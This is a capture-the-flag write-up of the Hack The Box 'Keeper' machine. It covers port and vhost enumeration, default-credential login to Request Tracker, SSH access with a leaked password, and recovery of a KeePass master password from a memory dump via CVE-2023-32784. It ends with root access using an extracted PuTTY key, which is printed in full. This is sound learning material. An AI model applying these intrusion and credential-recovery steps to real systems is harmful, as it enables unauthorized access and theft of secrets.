## Description
Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With `SSH` access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the `Keepass` database, we can access the root `SSH` keys, which are used to gain a privileged shell on the host.
## Enumeration
As usual, let's start by a nmap scan. Using the knowledge from the previous boxes, I will run a UDP scan at the same time:
```
$sudo nmap -sS -sU -p- 10.129.88.79
[sudo] password for x5450: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 21:35 CEST
```
Well, it is soooooo long. I understand now why people do TCP and UDP scans separately. Let's start by a TCP scan first:
```
$sudo nmap -sS -oN nmap -p- 10.129.88.79
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 21:45 CEST
Nmap scan report for 10.129.88.79
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
We have an HTTP server running. Let's run some scripts to know more about it:
```
$sudo nmap -sC -sV -oN nmap_default_scripts -p80 10.129.88.79
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 21:46 CEST
Nmap scan report for 10.129.88.79
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
```
The server is running nginx 1.18.0, and it seems to be a custom website according to the title. We will look at the website content in a second, let's look at any known vulnerabilities. First, this version of nginx seems vulnerable to multiple vulnerabilities: https://www.cybersecurity-help.cz/vdb/nginx/nginx/1.18.0/
We can also run a nmap scan:
```
$sudo nmap --script vuln -oN nmap_vuln_scripts -p22,80 10.129.88.79
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 21:48 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.88.79
Host is up (0.021s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://seclists.org/fulldisclosure/2011/Aug/175

Nmap done: 1 IP address (1 host up) scanned in 126.19 seconds
```
This is weird because the only vulnerability found is related to Apache while a nginx server is running.

Now, let's look at the website. The main page contains only one link which redirect to `http://tickets.keeper.htb/rt/`. Let's map the IP address of the server to `keeper.htb` domain name in our `/etc/hosts` file:
```
#echo 10.129.88.79 keeper.htb >> /etc/hosts
```
But after doing this, we do not get access to `tickets.keeper.htb`. Maybe the subdomain is not available anymore but let's look if there are any other subdomains:
```
$gobuster dns -d keeper.htb -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     keeper.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/dirb/common.txt
===============================================================
2023/09/22 22:03:22 Starting gobuster in DNS enumeration mode
===============================================================
                              
===============================================================
2023/09/22 22:05:18 Finished
===============================================================
```
No common subdomains. Let's look at the potential subdirectories:
```
$gobuster dir -u http://keeper.htb -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://keeper.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/09/22 22:06:30 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 149]
                                               
===============================================================
2023/09/22 22:06:40 Finished
===============================================================
```
The `index.html` file is the homepage of the server, so we have nothing interesting to learn from this scan.

In parallel, I run the nmap UDP scan:
```
$sudo nmap -sU -p- --min-rate 1000 -oN nmap_udp 10.129.88.79
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 22:04 CEST
Warning: 10.129.88.79 giving up on port because retransmission cap hit (10).
Nmap scan report for keeper.htb (10.129.88.79)
Host is up (0.021s latency).
All 65535 scanned ports on keeper.htb (10.129.88.79) are in ignored states.
Not shown: 64811 open|filtered udp ports (no-response), 724 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 718.46 seconds
```
Well, this is a dead-end.

The most interesting path so far is the vulnerabilities of the nginx 1.18 server and more specially the RCE (CVE-2021-23017). This vulnerability requires to know the DNS server used by the target. I do not know how to get this information (and I am not even sure the server is using any DNS server).

I noticed that I forgot to get the version and run the default scripts on the SSH server:
```
$nmap -sC -sV -p22 -oN nmap_ssh_version 10.129.68.247
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-23 10:34 CEST
Nmap scan report for keeper.htb (10.129.68.247)
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
```
OpenSSH version is 8.9p1. It seems this version is vulnerable to CVE-2023-38408. I have taken a look to the exploit available on GitHub... Well, I hope this is not this vulnerability to exploit, it seems too high level to me for now.

I also made the confusion with gobuster between the `dns` option and the `vhost` option. So I run it again with the correct command:
```
$gobuster vhost -u http://keeper.htb/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://keeper.htb/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/09/23 10:50:20 Starting gobuster in VHOST enumeration mode
===============================================================
Found: tickets.keeper.htb (Status: 200) [Size: 4236]
                                                    
===============================================================
2023/09/23 10:50:30 Finished
===============================================================
```
We can see that `tickets.keeper.htb` is a valid subdomain. However, I have not been able to open it from my browser. By adding this line to `/etc/hosts` file, I have been able to access it:
```
# echo "10.129.68.247 tickets.keeper.htb" >> /etc/hosts
```
I have now a login interface. Is installed Best Practical Request Tracker 4.4.4.

I have run another gobuster scan to search for hidden directory in this subdomain:
```
$gobuster dir -u http://tickets.keeper.htb/ -w /usr/share/wordlists/dirb/common.txt -b 302
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://tickets.keeper.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   302
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/09/23 11:02:29 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4236]
/l                    (Status: 403) [Size: 0]   
/m                    (Status: 200) [Size: 2309]
/rte                  (Status: 200) [Size: 95]  
/rtf                  (Status: 200) [Size: 95]  
                                                
===============================================================
2023/09/23 11:03:15 Finished
===============================================================
```
The `m` directory sent us on a login page for mobile, and `rte` and `rtf` on an error page with the following message: `An internal RT error has occurred. Your administrator can find more details in RT's log files.`.
## Exploitation
It seems RT 4.4.4 is vulnerable to time attack (CVE-2021-38562). I tried to write a little script to check that, but it seems that every username takes the same amount of time to connect. After I tried this script, I thought to use default credentials which are root/password, and it works! I have now access to the administration interface.
### Root admin interface enumeration
In the root admin, we can search tickets, look at reports, articles and assets. Something that I notice directly is that the server is badly configured because I have this error:
```
Possible cross-site request forgery

RT has detected a possible cross-site request forgery for this request, because the Referrer header supplied by your browser (tickets.keeper.htb:80) is not allowed by RT's configured hostname (keeper.htb:80). A malicious attacker may be trying to modify a dashboard on your behalf. If you did not initiate this request, then you should alert your security team.

If you really intended to visit http://keeper.htb/rt/Dashboards/Modify.html and modify a dashboard, then click here to resume your request.
```
This can be encountered, but I will continue the enumeration for now.
I also get a ticket created by `lnorgaard`:
```
Attached to this ticket is a crash dump of the keepass program. Do I need to update the version of the program first...?
```
And in comment of this post:
```
I have saved the file to my home directory and removed the attachment for security reasons.
```
Then, in the admin interface, you can get the list of the users and I noticed there are only two, the root user and `lnorgaard`. In the comment about this user, you have this note:
```
New user. Initial password set to Welcome2023!
```
I tried to use this password to connect in SSH:
```
$ssh lnorgaard@10.129.59.214
The authenticity of host '10.129.59.214 (10.129.59.214)' can't be established.
ECDSA key fingerprint is SHA256:apkh696g2/uAeckIXd6eFvgmvmPqoEj41w4ia45OfrI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.59.214' (ECDSA) to the list of known hosts.
lnorgaard@10.129.59.214's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$
```
It worked! I can now get the user flag:
```
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ cat user.txt
8[...SNIP...]b
```
## Privilege escalation
### `lnorgaard` enumeration
Now that we have access to `lnorgaard` session, we can look at the files in the home folder and more specifically into the crash dump given by the root user as explained in the ticket we saw earlier. There is a zip file in the home folder that contains two files:
```
lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp  RT30000.zip  passcodes.kdbx  user.txt
```
There is a dump file of the application KeePass and a file `kdbx` which is a database for this application. We will try to get passwords from this file using `keepass2john` and `john`. First, we will transfer the file in our machine:
```
$scp  lnorgaard@10.129.59.214:~/passcodes.kdbx passcodes.kdbx
```
To run the bruteforce, I first need to find back the hashes from the KeePass database and then run john:
```
$keepass2john passcodes.kdbx > hash
$john --wordlist=/usr/share/wordlists/rockyou.txt
```
The analysis takes soooo loooong that I have time to find another way to crack this. I am wondering if I could get something from the dump file:
```
$file KeePassDumpFull.dmp 
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type
```
This dump file can be opened from `Ghidra`, but I did not find anything interesting from there. I also opened it using `radare2`, but I was unable to get a stack trace neither reading the heap. I also tried to get the strings from the dump file to do a dictionary attack, but it seems there are too many possibilities:
```
$strings KeePassDumpFull.dmp | wc -l
1988198
```
While I was searching what I could do with this dump file, I found [CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784) that says that in versions 2.x before 2.54, it is possible to recover the master password from a memory dump. I found an [exploit in Python](https://github.com/CMEPW/keepass-dump-masterkey) and get these possibilities from the master password. Before using it, I should check the version of KeePass is vulnerable to the exploit. I do not know if my method is correct but, by looking at the strings in the dump file, the version seems to be 2.53.1, so it is vulnerable to the exploit:
```
$strings KeePassDumpFull.dmp | grep "2\.5"
2.53.1.0
				<bindingRedirect oldVersion="2.0.9.0-2.53.1.0"
					newVersion="2.53.1.20815" />
				<bindingRedirect oldVersion="2.0.9.0-2.53.1.0"
					newVersion="2.53.1.20815" />
*<.wZ@2;/-??-?0;.PX\SSSSW02.5EA
2.5.29.10
2.5.29.19
```
Let's use it:
```
$python3 ~/github/keepass-dump-masterkey/poc.py KeePassDumpFull.dmp 
2023-09-25 19:37:20,758 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```
Well, I could do a bruteforce attack as suggested in the GitHub page, but it seems to be Danish and searching with `●Adgr●d med flode` on Google let me find `rødgrød med fløde` which is a Danish dish. I can now read the database:
```
$kpcli --kdb ~/Documents/htb/machines/keeper/evidence/data/passcodes.kdbx 
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```
I can now look from some interesting data:
```
kpcli:/> ls
=== Groups ===
passcodes/
kpcli:/> cd passcodes/
kpcli:/passcodes> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
kpcli:/passcodes> cd Network/
kpcli:/passcodes/Network> ls
=== Entries ===
0. keeper.htb (Ticketing Server)                                          
1. Ticketing System                                                       
kpcli:/passcodes/Network> show -f -a 0

Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4><3K0nd!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
Icon#: 3
Creat: 2023-05-19 08:36:50
Modif: 2023-05-24 10:48:21
Xpire: Never
```
I get a password and an RSA key. Let's try the password:
```
$ssh root@10.129.103.106
root@10.129.103.106's password: F4><3K0nd! 
Permission denied, please try again.
```
It does not work. Let's try with the key. I put it in a file named `id_rsa.ppk`:
```
$ssh -i id_rsa.ppk root@10.129.103.106
Load key "id_rsa.ppk": invalid format
```
It seems the PPK format (Putty private key) is not supported. We need to convert it to OpenSSH format:
```
$puttygen id_rsa.ppk -O private-openssh -o id_rsa.ssh
puttygen: error loading `id_rsa.ppk': PuTTY key format too new
```
Whaaaaat?! It seems I can't convert it with `puttygen`! I have tried using `puttygen.exe` using Wine, and it seems that I can convert it with it:
```
$cat id_rsa.ssh 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
[...SNIP...]
BE5xsjTZIzI66HH5sX5L7ie7JhBTIO2csFuwgVihqM4M+u7Ss/SL
-----END RSA PRIVATE KEY-----
```
Let's use it now:
```
$ssh -i id_rsa.ssh root@10.129.103.106
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa.ssh' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa.ssh": bad permissions
root@10.129.103.106's password: 

$chmod 600 id_rsa.ssh 
$ssh -i id_rsa.ssh root@10.129.103.106
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Mon Sep 25 19:27:38 2023 from 10.10.14.93
root@keeper:~# cat root.txt
b[...SNIP...]4
```
It works after changing the permissions of the file because ssh refuses to read private key file that have read permissions by other users.
## Learning from other writeups
### Official writeup
The only difference I found in this walkthrough is that it did not get the issue I had with `puttygen` to convert the private key. Maybe we were not using the same versions. Also, `dotnet` is used to run the exploit. It can be interesting to use if I have other exploits that requires Windows.
### 0xdf writeup
In this [writeup](https://0xdf.gitlab.io/2024/02/10/htb-keeper.html), the writer also got some issues to run the exploit. It is interesting to note the user of Docker to run it.
## Lessons learned
I took time to find that default credentials should be used to log in as an admin. I think it could be interesting to have a more structured approach for login bypass. I found [this page of hacktricks](https://book.hacktricks.xyz/pentesting-web/login-bypass) that list some actions to perform. Using default credentials is almost at the top of the list.
Also, after getting the foothold, I did not do a new proper enumeration and vulnerability analysis. I think I should get the number version of `KeyPass` at the very beginning and look at potential vulnerabilities after that. It would again save me a lot of time.